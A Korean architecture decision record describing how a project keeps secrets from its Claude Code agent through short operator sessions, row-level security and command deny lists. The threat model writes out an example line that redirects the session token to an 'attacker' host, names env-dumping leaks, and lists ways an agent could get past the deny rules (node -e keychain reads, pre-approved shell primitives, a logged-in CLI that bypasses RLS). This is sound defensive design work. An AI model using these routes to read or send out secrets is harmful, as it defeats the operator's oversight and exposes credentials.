# ADR-016 — 시크릿은 저장하지 않는다: 운영자가 로그인하고, 스크립트는 그 짧은 세션으로 붙는다

> 최종 수정: 2026-10-08 (v12: 「서버에 두는 장기 값」 절 — [ADR-028](ADR-028-vercel-remote-worker.md) 서버 워커(Vercel `zgnn-worker`)에 `CLAUDE_CODE_OAUTH_TOKEN`·네이버 검색 키 둘만 둔다. Supabase 장기 키는 여전히 어디에도 없다 — 서버의 DB 쓰기는 버튼을 누른 운영자의 JWT 다)
> 이전 2026-10-07 (v11: 운영자 세션이 쓰는 표가 둘 늘었다 — `pipeline_requests`(지금 돌려 줘 요청)·`workers`(로컬 워커 심장, [ADR-024](ADR-024-local-worker-and-db-queues.md), 마이그레이션 `20261007140000`, 원격 미적용). 모양은 `pipeline_runs` 그대로(select/insert/update · 정책 셋 `is_operator()` · delete·anon 없음). Realtime publication 에 표 여섯 — 구독은 RLS 를 지켜 publishable 키만으론 행이 안 온다. 새 키·새 출처 없음)
> 이전 2026-10-06 (v10: 운영자 세션이 쓰는 표가 하나 늘었다 — `pipeline_runs`(실행 기록, [ADR-023](ADR-023-ops-dashboard-and-run-log.md), 마이그레이션 `20261006120000`). authenticated 에 select/insert/update(delete 없음) + 정책 셋 `is_operator()`, anon 은 아무것도 없다. 집계 rpc `ops_overview()` 는 definer · 첫 줄 운영자 확인 · anon/PUBLIC execute 회수, Vault 는 **이름만** 본다. 새 키·새 출처 없음)
> 이전 2026-10-05 (v9: **네이버 키는 사용자 홈의 파일 `~/.zgnn-naver.env` 에서도 읽는다**(`scripts/lib/naverEnvFile.mjs`) — env 가 비어 있을 때만, 이름 넷(`NAVER_CLIENT_ID`·`_SECRET`·`NAVER_MAP_CLIENT_ID`·`_SECRET`)만.
> 재분석은 구독 한도에 닿을 때마다 다시 돌리는 일이라 매번 숨김 입력 넷이 그 일을 미루게 했고, 에이전트 세션은 입력을 받지 않아 아예 못 돌았다.
> "저장하지 않는다" 의 대상은 여전히 **레포와 Supabase 장기 키**다 — 이 파일은 레포 밖이고, 다른 이름은 적혀 있어도 읽지 않으며, 600 이 아니면 멈춘다. 네이버 검색 키는 하루 한 번 초기화하는 값이라 둔 예외다)
> 이전 2026-10-01 (v8: 인증 출처는 여전히 둘(세션·anon)이지만 **anon 이 처음 쓴다** — 사이트 상세의 장소 제보가 `place_reports` 에 열 단위 insert 만([ADR-021](ADR-021-place-reports.md), 마이그레이션 `20261001130000`). 키·세션 모델은 그대로다 — 새 키가 없다)
> 이전 2026-09-29 (v7: **브라우저 세션 정책을 한 항으로 명시**했다 — 운영자 검수 화면 `/admin`([ADR-018](ADR-018-in-app-admin-review.md))도 CLI 와 같은 모양으로 붙는다:
> access token 만 localStorage(`zgnn.admin.session`)에, refresh token 은 버린다, `persistSession:false`·`autoRefreshToken:false`, 수명 1일 초과면 거부.
> supabase-js 의 브라우저 기본값(refresh token 을 localStorage 에 저장 + 자동 갱신)은 이 결정과 정반대라 **끄는 것이 설정이 아니라 경계**다.
> 함께: publishable 키와 프로젝트 호스트가 **실제로 번들에 들어갔고**(결정 4), 유출 검사의 `supabase.co` 는 전면 차단에서 **우리 호스트 하나만 허용**으로 좁혔다)
> 이전 (v6: (b) 의 현재 상태를 상태 줄에 맞춤 — **원격 적용·실측 완료**, 열린 것은 어드바이저 대시보드 확인 하나(사용자 몫).
> GitHub Secrets 는 0개라 "이름 삭제" 가 남은 일이 아니다. JWT expiry 는 사용자가 3600 → **43200** 으로 올렸다(실효 창 11.5시간). (b) 검증 순서를 기록 시제로)
> 이전 (v5: **GitHub Actions 폐지 — 인증 출처는 둘뿐**, 운영자 세션(JWT)과 anon(publishable). service_role 경로를 코드에서 지웠다:
> `readOnly` 는 항상 anon(env 에 service 키가 남아 있으면 **이름만** 경고 한 줄, 빌드는 계속), 쓰기 경로는 셸 env 에 service 키가 있으면 CI 여부와 무관하게 **무조건 멈춘다**(env 파일은 읽지 않는다).
> 수집·분석·반영은 사용자가 `pnpm data:login` 한 로컬 터미널에서만 돈다. 네이버 검색 키는 사용자 로컬 관리(env 또는 TTY 숨김 입력, 저장 없음, 에이전트 세션 거부).
> v4 의 보류 셋을 닫았다 — (a) 봇 운영자 로그인 **기각**, (b) GRANT 축소는 `narrow_grants` 마이그레이션으로 구현(**원격 적용·실측 완료 2026-09-22 (6)**), (c) Actions **폐지**)
> 이전 (v4: **Auth 로그인 모델** — `pnpm data:login` 이 Supabase Auth 사용자(운영자)로 로그인해 access token 하나를 키체인에 넣고,
> `pnpm data:*` 는 publishable 키 + 그 JWT 로 붙는다. RLS 가 `operators` 허용 목록으로 가른다. v3 의 PAT 경로(`supabase projects api-keys`)는 폐기 —
> PAT 는 만료가 없어 "토큰 1일 미만" 요구를 못 채웠다. service_role 키는 GitHub Actions 에만 남는다)
> 이전 (v3: 키체인 스크립트(`pnpm secrets`) 폐기 → CLI 로그인 모델. `supabase login` 만 돼 있으면 스크립트가 실행 시점에 키를 받는다 — 보류 뒤 폐기)
> 이전 (v2: `SUPABASE_URL` 도 키체인으로, 노출된 키는 회전 — 커밋 전 폐기)
> 이전 (v1: 신설 — macOS 키체인 + `scripts/secrets.mjs`. 사용자 결정 "Claude 가 시크릿 값을 읽는 순간부터 문제다")
> 상태: **v6 확정, 코드 구현됨**(`supabaseClient.mjs` 출처 둘 · `collect-blog.mjs` 네이버 키 숨김 입력 · `scripts/lib/readHidden.mjs` · `.github/workflows/collect.yml` 삭제 ·
> `claude` 자식 env 허용 목록에서 토큰·CI 변수 제거). (b) 의 `supabase/migrations/20260922120000_narrow_grants.sql` 은 **원격 적용·실측 완료**(2026-09-22 (6) —
> 아래 "보류였던 것" 의 검증 기록). 열린 것은 **Supabase 어드바이저 대시보드 확인 한 항목뿐**(CLI 로 볼 수 없어 사용자 몫). v4 까지: 마이그레이션 2개 적용, 보안 리뷰(4 렌즈+적대 검증) 반영, PostgREST 실측 완료.
> **이 설계는 `pnpm data:*` 경로를 가둔다 — 이 머신 자체는 아직 아니다**(아래 "잔존 위험"). 남은 것은 사용자 터미널 잠금(`gh`·SSH·`vercel`)뿐이다 —
> GitHub Secrets 는 **0개**(2026-09-22 (5) 실측)라 지울 이름이 없다. [todo/README](../todo/README.md) 다음 할 일.

## 맥락

파이프라인(02 수집·03 분석·`data:pull`)이 로컬에서도 돌아야 해서 DB 쓰기 권한이 로컬에 필요했다. 처음엔 `SUPABASE_SERVICE_ROLE_KEY` 를
`.env.local` 에 두고 읽었는데, 이 레포의 작업 대부분을 에이전트(Claude Code)가 한다 — 에이전트는 디버깅하다 `cat .env.local` 을 치고,
그 값은 대화 기록·서브에이전트 프롬프트·리뷰 워크플로에 실려 밖으로 나간다. **파일에 값이 있는 한 "읽지 마라" 는 규칙은 한 번의 실수로 무너진다.**

세 번 고쳤다. v1 은 키체인에 값을 넣고 관리 스크립트로 꺼내는 방식 — 사용자가 "관리 절차가 하나 더 생긴다" 고 거부. v2 는 그 변형.
v3 은 `supabase login`(PAT) 만 돼 있으면 스크립트가 `projects api-keys` 로 service_role 키를 실행 시점에 받는 방식 — 동작했지만
**PAT 는 만료가 없다.** 사용자가 그린 요구 다섯 개 중 마지막을 못 채웠다:

① Claude 는 시크릿을 모른다 ② 작업자가 있을 때 로그인을 요청한다 ③ 사용자가 직접 로그인한다 ④ 그 토큰으로 쓴다 ⑤ **토큰 유효기간 1일 미만.**

v3 은 로그인 한 번이 영구 service_role 접근이었다. 요구 ⑤는 "에이전트가 무엇을 손에 넣든 하루면 죽는다" 는 뜻이고, 그건 키가 아니라
**세션**이어야 나온다.

v4 는 그 세션 모델을 로컬에 세우고 service_role 키를 GitHub Actions 에만 남겼다. 그런데 사용자 재확인(2026-09-22, "Claude 는 민감정보를 알아선 안 된다")의
함정은 값을 숨기는 것이 아니라 **접근 경로 = 읽기 경로**라는 데 있다 — 에이전트가 push 할 수 있으면 러너의 env 는 `console.log(process.env.X)` 한 줄로 찍히고,
Free private 레포는 브랜치·환경 보호가 안 된다. 러너에 키가 남아 있는 한 "관리자 없이 RLS 를 우회하는 만료 없는 키" 가 하나 남는 셈이다. v5 는 그 러너 자체를 없앤다 —
수집은 어차피 사람이 승인해야 반영되므로 화·금 자동으로 돌 이유가 없었다.

## 결정

1. **어떤 스크립트도 service_role 키를 쓰지 않는다**(v4 는 "로컬 스크립트는" 이었다). Supabase Auth 의 사용자(운영자)로 로그인한 **짧은 JWT** 로 PostgREST 에 붙고,
   RLS 가 권한을 가른다. 마이그레이션 `20260921075901_operators_rls`·`20260921080333_is_operator_invoker`:
   - `operators(user_id → auth.users)` 허용 목록. `is_operator()`(security invoker, `search_path = ''`)가 "호출자가 목록에 있는가" 를 답한다.
   - `authenticated` 이면서 운영자인 사용자: `places`·`items`·`blog_posts`·`candidates`·`place_sources` 를 **select/insert/update**. v4 에선 여기에 delete 가 있었으나
     v5 의 세 번째 마이그레이션 `20260922120000_narrow_grants` 가 GRANT 와 정책 양쪽에서 걷었다(원격 적용·실측 완료 — 운영자 세션의 delete 는 42501, 아래 "보류였던 것" (b)).
     **`authenticated` 만으로는 아무것도 못 한다** — 원격 프로젝트가 회원가입을 열어 두면 아무나 `authenticated` 가 된다. 허용 목록이 관문이다.
   - `anon`(publishable 키): `places` 의 `status='published'` 와 `items` 를 **select 만**. `scripts/pull-db.mjs` 가 읽는 것과 정확히 같은 집합 —
     이미 사이트에 구워져 공개된 데이터라 새로 노출되는 것이 없다. Vercel 빌드가 이 경로다.
   - 운영자 추가는 SQL 로만(`supabase db query --linked "insert into operators …"`). API 로는 `operators` 를 자기 행 하나만 읽을 수 있다(열거 불가).
2. **`pnpm data:login`(`scripts/login.mjs`)** 이 세션을 만든다. TTY 가 아니거나 `CLAUDECODE` 가 켜져 있으면 거부 — 비밀번호가 에이전트
   대화 기록에 실릴 길을 막는다. 이메일·숨김 비밀번호 → `signInWithPassword` → **access token 만** macOS 키체인(`zgnn` / `SUPABASE_SESSION`)에.
   **refresh token 은 버린다** — 무료 플랜엔 세션 타임박스가 없어 저장하면 사실상 영구 로그인이 된다. 토큰의 `exp` = 대시보드
   Authentication → JWT expiry(8~12시간 권장 — 2026-09-22 사용자가 **43200**(12시간)으로 설정)가 곧 "하루 한 번 로그인". `pnpm data:logout` 은 키체인 항목만 지운다.
   **브라우저도 같은 모양이다**(v7, [ADR-018](ADR-018-in-app-admin-review.md)): 운영자 검수 화면 `/admin` 은 `signInWithPassword` 뒤 access token 만 localStorage
   (`zgnn.admin.session`)에 넣고 refresh token 을 버린다. 클라이언트는 `persistSession: false`·`autoRefreshToken: false` + `Authorization: Bearer <jwt>` 로 만들고,
   수명이 하루를 넘는 토큰은 CLI 처럼 거부한다. **supabase-js 의 브라우저 기본값이 정확히 반대**(refresh token 을 localStorage 에 두고 자동 갱신)이므로,
   그 둘을 끄는 것은 취향이 아니라 이 ADR 의 경계를 지키는 유일한 방법이다 — 키는 파일에 없고 `exp` 는 12시간이며 할 수 있는 일은 RLS 범위뿐이라는 세 줄이 그대로 유지된다.
   저장소가 키체인이 아니라 localStorage 인 것은 브라우저에 키체인이 없어서고, 그래서 **경계는 저장소가 아니라 수명**이라는 점이 v7 에서 분명해졌다.
3. **통로는 `scripts/lib/supabaseClient.mjs` 하나.** `createSupabase({ readOnly })` 가 출처를 고른다 — 출처는 **둘**뿐이고 스크립트 종류가 정한다:
   link 된 ref 검사 → publishable 키 형식 단언 → `readOnly`(`data:pull`) 면 **항상 anon**(세션이 있어도 싣지 않는다 — published 만 읽는 스크립트에 운영자 토큰을
   실을 이유가 없고, Vercel 과 로컬이 같은 경로로 돈다) → 쓰기 스크립트(seed·collect·analyze·apply)는 키체인 세션.
   **service 키 트립와이어(v5)**: env 에 `SUPABASE_SERVICE_ROLE_KEY` 가 "있다" 자체가 사고다 — 쓰기 경로는 CI 여부와 무관하게 **무조건 멈춘다**(세션이 유효해도 먼저 본다 —
   키를 지우기 전엔 쓰기 스크립트가 돌지 않게. v4 의 `CI=1` 예외는 그 한 줄로 넘어가는 구멍이라 없앴다). `readOnly` 는 그래도 anon 으로 **계속 가되** 무시한 env 의 **이름만** 경고
   한 줄로 찍는다 — 멈추면 "빌드는 anon" 이 다시 env 정리 순서에 묶이고(`1b4264c` 불변식), 조용히 넘기면 감지가 사라진다(옛 `.env.local` 잔존을 처음 잡은 것이 바로 그 출처 로그였다).
   **읽기는 경고, 쓰기는 정지** — 이 비대칭이 의도다.
   세션은 `exp` 30분 앞을 만료로 본다(긴 `data:analyze` 가 중간에 401 로 죽지 않게 — 한 실행은 세션 창(expiry − skew) 안에 끝나야 한다, `analyzeCandidates.mjs` 의 `DEFAULT_LIMIT` 주석. **JWT expiry ≥ 8시간을 전제한다.** 원격은 2026-09-22 사용자가 기본 3600 → **43200** 으로 올렸다 —
   실효 창은 **11.5시간**(43200 − skew 30분)이라 긴 `data:analyze` 도 한 세션에 든다. 3600 인 채면 로그인 뒤 30분뿐이라 대시보드 값이 먼저였다) 하고, **수명이 하루를 넘으면 거부한다**(요구 ⑤를 코드가 단언 — 대시보드 JWT expiry 는 값 없이 검증할 수 없다). **쓰기 스크립트는 세션이 없거나 만료면 그 자리에서 멈추고 `pnpm data:login` 을 안내한다** — anon 으로 보내면
   첫 insert 에서 RLS 42501 로 죽는데 그 메시지는 "로그인하라" 로 읽히지 않는다. `data:pull` 은 결과가 비면 파일을 덮어쓰지 않고 exit 1(빈 사이트 배포 방지).
   어느 출처를 썼는지 **이름만** 한 줄 찍는다(`Supabase 인증: 로그인 세션(JWT …)`) — `data:pull` 은 두 출처가 같은 결과를 내서 로그 없이는 구분이 안 된다.
4. **URL 과 publishable 키는 코드 상수다**(`PROJECT_REF`·`PUBLISHABLE_KEY`, 2026-09-29 부터 import 없는 `scripts/lib/supabasePublic.mjs` 에 — 브라우저도 가져간다).
   둘 다 공개값 — ref 는 API 주소의 서브도메인, publishable 키는
   브라우저 번들에 실으라고 만든 키다(방어선은 RLS). **v7: "실으라고 만든" 이 가정에서 사실이 됐다** — `/admin` 이 들어가면서 publishable 키와
   `<ref>.supabase.co` 리터럴이 실제로 `out/` 에 박힌다([ADR-018 §2](ADR-018-in-app-admin-review.md), [ADR-015 §2](ADR-015-supabase-source-and-rebuild.md) 번복).
   그래서 `scripts/check-bundle.mjs` 의 `supabase.co` 패턴을 **우리 호스트가 아닌 `*.supabase.co`** 로 좁혔다 — 다른 프로젝트로 데이터가 새는 오타는 계속 잡고,
   `service_role`·`sk-ant-`·`sb_secret_`·JWT 패턴은 한 글자도 손대지 않았다. `sb_publishable_` 은 처음부터 패턴에 없었다(공개 전제). 상수인 이유: Vercel 빌드엔 `supabase/.temp/project-ref`(gitignored)가 없다.
   link 된 ref 가 상수와 다르면 멈춘다 — 스키마(CLI)와 데이터(스크립트)가 다른 프로젝트를 가리키는 사고를 막는다. **URL 은 env 로 바꿀 수 없다**(코드 상수뿐) —
   바꿀 수 있으면 `SUPABASE_URL=https://attacker pnpm data:apply` 한 줄(허용된 명령)이 키체인 JWT 를 밖으로 보낸다(리뷰 지적). `PUBLISHABLE_KEY` 는 `sb_publishable_` 형식을 단언한다 —
   공개 상수 자리에 secret 키를 붙여 넣어도 PostgREST 는 그대로 돌아서(RLS 우회) 아무 테스트도 못 잡는다.
5. **service_role 키는 어디에도 없다**(v5. v4 는 "GitHub Actions 에만 남는다" 였다 — 러너는 로그인할 수 없으니 키를 둘 수밖에 없었고, 그 키는 push 한 줄로 읽혔다).
   수집·분석·반영(`data:collect` → `data:analyze` → `data:apply`)은 사용자가 `pnpm data:login` 한 **로컬 터미널**에서만 돈다 — 스케줄·`workflow_dispatch`·러너 없음
   (`.github/workflows/collect.yml` 삭제). GitHub Secrets 는 **0개**(2026-09-22 (5) 실측) — 코드가 읽는 시크릿이 없으니 남은 이름은 Claude 가 `gh secret list` 로 보고 `gh secret delete` 로
   지웠다(이름만 다루므로 Claude 가 해도 된다 — todo 다음 할 일 2. `SUPABASE_SERVICE_ROLE_KEY` 는 legacy 키 퇴역으로 이미 죽은 값, `SUPABASE_URL` 은 공개값). 새 secret 키는 만들지 않는다.
   **네이버 검색 키(`NAVER_CLIENT_ID`·`NAVER_CLIENT_SECRET`)는 사용자가 로컬에서 직접 관리한다.** `collect-blog.mjs` 는 env 로 받고, 없으면 TTY 숨김 입력으로 받는다
   (`scripts/lib/readHidden.mjs` — 로그인 비밀번호와 같은 통로라 두 소유자, owner-prefix 예외). 레포·키체인·파일 어디에도 저장하지 않는다 — 저장하면 그 자리가 곧 유출 경로고,
   매번 치는 비용은 수집이 사용자가 돌릴 때만 도는 일이라 감수한다. 입력이 필요한데 에이전트 세션(`CLAUDECODE`)이면 exit 1(대화 기록에 실릴 수 있다). env 로 둘 다 넘겨 주면
   에이전트 세션이라도 돈다 — 사용자가 셸에서 준 것이다. 둘 중 하나만 env 에 있으면 없는 쪽만 묻는다. 세션 검사(`createSupabase`)가 키 입력보다 먼저다 — 키 두 개를 치고 나서
   "pnpm data:login" 으로 멈추면 헛수고라서. Kakao REST 키(`KAKAO_REST_API_KEY`)는 선택 그대로 — env 에 없으면 좌표 보강을 건너뛴다. Claude 는 이 머신의 `claude` 로그인뿐 —
   토큰 env 는 없고, `claude` 자식 프로세스 env 허용 목록에서 `CLAUDE_CODE_OAUTH_TOKEN`·`CI`·`GITHUB_ACTIONS` 를 뺐다(그 env 로만 인증받던 머신에선 `data:analyze` 가 auth 로 멈춘다 — 의도).
   **비용**: 화·금 자동 수집이 없다 — `blog_posts` 는 사용자가 돌릴 때만 찬다.
   (v4 의 "코드가 강제한다" — `CI` 가 아니면 service 키를 거부 — 는 결정 3 의 트립와이어로 강화됐다. 출발점은 구현 당일 옛 `.env.local` 이 남아 있어 `data:pull` 이 세션 없이
   service 로 붙는 걸 로그로 발견한 일이다. 그 파일이 곧 "관리자 없이 되는 키" 였다.)
6. **레포에 env 파일은 없고, `data:*` 스크립트는 env 파일을 읽지 않는다**(`--env-file-if-exists` 제거 — 파일 한 줄로 service 키·URL 을 주입하는 통로였다).
   `ANALYZE_MODEL` 은 셸 env 로(`ANALYZE_MODEL=… pnpm data:analyze`). `.env.local` 은 `NEXT_PUBLIC_KAKAO_MAP_KEY` 를 바꿀 때만(Next 가 읽는다).
7. **`.claude/settings.json` 의 deny 는 사고 방지 장치지 경계가 아니다.** `Read(./.env*)`·`Bash(security find-generic-password …)`·`Bash(security -i …)`·
   `Bash(supabase projects api-keys …)`(`pnpm exec`·`pnpm`·`npx`·`node_modules/.bin`·`/usr/bin` 접두, 인자 없는 형태 포함)·`Bash(vercel env pull …)`.
   bypass 세션에서도 막히고(`security -i` 는 파이프 안에서도), 이 CLI 버전은 `Read` deny 가 Bash 의 파일 참조(`cat .env.local`)까지 막는 걸 리뷰가 실측했다.
   그래도 경계가 아닌 이유: 키체인은 `node -e` 한 줄로 읽히고(`security` 철자만 막는다), gitignored `.claude/settings.local.json` 의 allow 에는
   `Bash(node -e ' *)`·`Bash(python3 -c ' *)`·`Bash(gh auth *)` 같은 우회 원시가 **무프롬프트로 사전 승인**돼 있다(추적되지 않는 파일은 보안 불변식을 지킬 수 없다 —
   지울지는 사용자 결정). 경계는 세 가지뿐이다: **값이 파일에 없다 · `exp`(≤1일) · RLS 범위.** 키체인 JWT 를 읽어도 하루면 죽고 운영자 권한 밖은 못 한다.

## 왜 이것인가

- **PAT(v3)가 아닌 이유**: 만료가 없다. 요구 ⑤를 못 채운다. 또 PAT 로 받는 건 service_role 키라 RLS 를 통째로 우회한다 — 세션은 RLS 안에서 논다.
- **refresh token 을 버리는 이유**: 무료 플랜엔 "세션 최대 수명" 설정이 없다. refresh 를 저장하면 access token 이 짧아도 의미가 없다.
- **`is_operator()` 를 security definer 로 두지 않는 이유**: 어드바이저 0028/0029 가 definer 함수의 `/rest/v1/rpc` 노출을 경고한다. 실해는 없지만
  경고를 남기면 다음 진짜 경고가 묻힌다. invoker 로 두면 함수 안의 `operators` 조회에 RLS 가 걸리므로 자기 행 정책(`operators_read_self`)이 필요하다 —
  그게 없으면 **에러 없이 조용히 false**(빈 결과)가 된다. 이 함정이 이 결정에서 가장 비직관적인 부분이다.
- **회원가입을 대시보드에서 끄는 이유**: 켜져 있어도 허용 목록 밖이라 아무것도 못 하지만, 불필요한 `auth.users` 행과 이메일 발송이 생긴다.
- **1Password·Doppler 가 아닌 이유**: 도구를 바꿔도 "에이전트가 실행할 수 있는 명령으로 값을 꺼낼 수 있다" 는 구조는 같다. 세션 모델은 꺼내도 하루면 죽는다.
- **(a) 봇 운영자 로그인이 아니라 Actions 폐지인 이유**: 봇 계정으로 바꾸면 RLS 안으로는 들어오지만, 봇의 이메일·비밀번호가 GitHub Secrets 에 남는다 —
  "에이전트가 트리거할 수 있는 경로에 만료 없는 자격증명" 이라는 구조가 service 키와 같다. 자동 수집이 주는 것은 `blog_posts` 가 화·금에 저절로 차는 것뿐인데,
  반영은 어차피 사람이 승인해야 하므로 그 자동화가 아끼는 손은 없다.
- **(b) GRANT 를 좁히는 이유(`narrow_grants`)**: service 키가 없으니 두 출처 모두 RLS 를 지나고, 그러면 **GRANT 가 곧 상한**이다 — 정책은 "어느 행", GRANT 는 "어느 동작".
  Supabase 기본 default privileges 는 anon·authenticated 에 ALL(delete·truncate·references·trigger 포함)을 주므로 정책 실수 하나(`for all` 을 `using (true)` 로)가 delete 까지 연다.
  어떤 스크립트도 delete 하지 않으므로 select/insert/update 만 남기면 정책이 틀려도 delete 는 42501 로 막힌다(방어선 둘). 비직관: default privileges 를 끊은 뒤로는
  **`postgres` 가 만든 새 테이블은 정책을 붙여도 명시 grant 전엔 아무도 못 본다**(끊은 것은 `postgres` 의 default privileges 뿐이라 다른 역할이 만든 테이블엔 안 걸린다) —
  증상이 42501 이라 정책 버그처럼 읽히고, grant 는 했는데 정책이 없으면 조용한 `[]`. 새 테이블 마이그레이션엔 grant 한 줄이 규칙.
- **로그인된 `supabase` CLI(PAT)는 이 모델의 바깥이다.** 리뷰가 실측했다: 에이전트가 `db query --linked` 를 프롬프트 없이 실행해 `running_as: postgres, bypass_rls: true`.
  PAT 는 만료가 없고 DB 비밀번호도 CLI 키체인에 저장돼 있다 — **관리자 없이 RLS 를 우회하는 영구 키**가 하나 남아 있는 셈이다. 그래서 휴지 상태는 **로그아웃**
  (`pnpm exec supabase logout`)이고, 스키마 작업(`db push`·`operators` insert)이 필요할 때만 사용자가 로그인하고 끝나면 다시 로그아웃한다. "에이전트도 `db query` 를
  할 수 있다" 는 이전 문장은 이 리뷰로 철회한다.

## 결과

- 사용자: 하루 한 번 `pnpm data:login`(별도 터미널). 만료되면 `pnpm data:*` 가 "로그인 세션이 만료됐다(시각) — pnpm data:login" 으로 멈춘다.
- 에이전트: 사용자가 로그인한 동안 `pnpm data:analyze`·`data:apply`·`data:pull` 실행·결과 확인은 가능. `data:collect` 는 네이버 키 입력이 필요해 **사용자 터미널 몫**
  (사용자가 env 로 넘겨 주면 예외). `supabase db query`·`db push` 는 사용자가 CLI 로그인을 열어 준 동안만. Actions 로그는 없다(v5).
- 회전 절차: service_role 은 **없다**(legacy 키 퇴역, 새 secret 키는 만들지 않는다). 운영자 비밀번호는 대시보드 Users 에서 바꾸고 `pnpm data:login` 을 다시.
  네이버 키는 개발자센터에서 재발급 — 어디에도 저장돼 있지 않으니 지울 것도 없다.
- 확인 방법: **RLS 는 PostgREST 를 통해서만 검증한다** — `supabase db query`(postgres 역할)도 service_role 도 RLS 를 우회해서 정책이 깨져 있어도
  멀쩡해 보인다. anon 이 정책 없는 테이블(`candidates`)에서 `[]`, 운영자 JWT 가 같은 테이블에서 행(또는 insert 성공)을 얻으면 정책이 산 것이다.
  `data:pull` 은 항상 anon 이라 세션의 증거가 못 된다 — 세션 확인은 `pnpm data:apply --dry-run`: 운영자면 `반영 0건` exit 0, 비운영자면 정책이 닫혀
  `places 가 비어 있다` exit 1, 세션 없으면 로그인 안내. 쓰지 않으면서 세 경우가 갈린다.
  **2026-09-21 (4) PostgREST 로 실측 완료** — anon: `pnpm data:pull` 이 `publishable(anon)` 으로 86·15 행, diff 없음. 세션: `pnpm data:apply --dry-run` 이
  세션 없음 → 로그인 안내 exit 1 · 비운영자(`zgnn-test@gmail.com`, `operators` 밖) → `places 가 비어 있다` exit 1 · 운영자(`zgnn@gmail.com`) → `반영 0건` exit 0.
  같은 코드·같은 테이블에서 계정만 바꿔 세 결과가 갈렸으므로 정책이 산 것이다. 당시 원격 JWT expiry 는 기본 3600 이라 skew 30분과 합치면 실효 세션이 30분이었다 — 2026-09-22 사용자가 **43200** 으로 올려
  실효 창이 **11.5시간**이 됐다(코드는 그대로 — `SESSION_MAX_TTL_S` 24시간 안). 반영 확인은 다음 `pnpm data:login` 의 만료 문구가 **+12시간**인지 보는 것뿐이다.
- 실측(2026-09-21): 마이그레이션 2개 push, 어드바이저 "No issues found", 키체인 쓰기·덮어쓰기·삭제·형식 거부 스모크 통과, `resolveSupabaseCredentials`
  분기 14 테스트. `pnpm data:login </dev/null` 은 TTY 가드로 exit 1. PostgREST 경유 확인은 publishable 키·운영자 계정이 생긴 뒤(다음 할 일 1·2).
- **남아 있던 구멍(2026-09-21 발견, 사용자가 지운다)**: `.env.local`(`SUPABASE_SERVICE_ROLE_KEY`·`SUPABASE_URL`·`VERCEL_OIDC_TOKEN`)과
  `.vercel/.env.production.local`(BUG-005 재현 때 service 키를 손으로 넣고 안 지운 것 + 마켓플레이스 변수 34개, `POSTGRES_PASSWORD` 등은 `[SENSITIVE]` 자리표시자).
  에이전트의 `rm` 은 권한 거부돼 사용자 터미널에서 `rm -f .env.local .vercel/.env.production.local` — 2026-09-22 둘 다 없는 것 확인(닫힘). v5 의 트립와이어가 보는 것은 **셸 env(export)** 뿐이다 —
  `data:*` 는 env 파일을 읽지 않으므로(결정 6) 파일이 남아 있어도 감지되지 않는다. 잔존 여부는 사용자가 `ls -la .env* .vercel/` 로 확인한다.
- **실행 기록 `pipeline_runs`(2026-10-06)** — 쓰기 스크립트가 **같은 운영자 세션**으로 실행마다 한 행을 넣고 고친다(`scripts/lib/runLog.mjs`). 출처도 키도 늘지 않는다.
  `rebuild_log`(definer 트리거만 쓰는 위조 방지 표, select 만 grant)와 달리 authenticated 에 select/insert/update — 운영자 자신의 메모장이라서다(ADR-023 「결과」).
  원격 적용·실측(롤백 트랜잭션, `set local role` 로 역할을 바꿔서 — postgres 그대로면 RLS 를 우회한다): 운영자 insert·update 됨 · delete 42501 · anon select/insert/rpc 42501 · 비운영자 insert/rpc 42501.
- **로컬 워커 `pipeline_requests`·`workers`(2026-10-07, [ADR-024](ADR-024-local-worker-and-db-queues.md))** — 워커(`pnpm data`)도 **같은 운영자 세션**으로 붙는다. 세션이 만료되면 `login` 과 같은 숨김 입력으로 묻는다 — refresh token 을 두는 데몬은 없다.
  두 표는 `pipeline_runs` 와 같은 모양(authenticated select/insert/update, delete·anon 없음). Realtime(`supabase_realtime` 에 여섯 표)은 구독자의 RLS 를 적용하므로 publishable 키만으로는 아무 행도 오지 않는다 — 워커는 세션 토큰을 `realtime.setAuth` 로 넘긴다.
  마이그레이션 `20261007140000` 은 **원격 미적용** — 적용 뒤 같은 롤백 실측을 한다(파일 끝 주석에 SQL).
- **`pnpm login`·`pnpm logout` 은 pnpm 내장 명령**(npm 레지스트리 로그인)이라 package.json 의 `login` 스크립트를 가린다 — 그래서 `data:login`·`data:logout` 이다.

## 서버에 두는 장기 값 (v12, [ADR-028](ADR-028-vercel-remote-worker.md))

"레포와 Supabase 장기 키는 없다" 는 그대로다. 서버 워커(별도 Vercel 프로젝트 `zgnn-worker`)에만 값 둘이 산다.

| 값 | 수명 | 새면 | 회전 |
|---|---|---|---|
| `CLAUDE_CODE_OAUTH_TOKEN`(`claude setup-token`) | 1년 | 구독 한도가 탄다 — DB 에는 닿지 않는다 | claude.ai 에서 회수 → `claude setup-token` → `pbpaste \| tr -d '[:space:]' \| vercel env add CLAUDE_CODE_OAUTH_TOKEN production --sensitive` |
| `NAVER_CLIENT_ID`·`NAVER_CLIENT_SECRET`(검색 API) | 발급 앱 수명 | 하루 호출 한도가 쓰인다 | 네이버 개발자 센터에서 재발급 → 같은 식 |

- **Production 에만, Sensitive 로.** 프리뷰에는 두지 않는다(T0 실측 때 넣었던 것은 지운다 — todo/20 T8). 숨김 입력에 붙여 넣으면 줄바꿈이 Enter 로 먹혀 값이 잘린다(실측 49자) — 파이프로 넣는다.
- **DB 쓰기 권한은 서버에 없다.** 함수는 요청 헤더의 운영자 JWT 를 같은 검사(형식·exp·30분 앞당김·하루 상한·service 키 트립와이어)로 받아 그 요청 동안만 쓴다(`injectSession`). 그래서 서버가 통째로 새도 places 는 바뀌지 않는다.
- **`claude` 자식 env 허용 목록은 그대로다.** 서버 워커 표식(`ZGNN_WORKER_RUNTIME=vercel`, 진입점이 적는다)일 때만 토큰을 더한다 — 로컬은 env 에 토큰이 있어도 넘기지 않는다(결정 4 의 "그 env 로만 인증받던 머신은 멈춘다" 유지).
- **git 자동 배포는 꺼져 있다**(`worker/vercel.json`). push 한 줄이 env 를 읽는 빌드를 돌리지 못하게 — 배포는 `vercel deploy --prod` 손으로만. 남는 구멍은 Vercel CLI 로그인이 있는 기기에서 에이전트가 배포할 수 있다는 것 — 경계가 아니라 "배포 전 diff 를 본다" 는 습관이다(위협 4 와 같은 모양).

## 잔존 위험 — 이 머신에서 "관리자 없이 되는 것" (보안 리뷰 2026-09-21, 4 렌즈 일치 · v5 갱신 2026-09-22)

설계는 `pnpm data:*` 경로에서 요구 ①~⑤를 채운다. 그러나 이 머신에는 그 경로 밖에서 관리자 없이·만료 없이 DB 나 시크릿에 닿는 자격증명이 있었다.
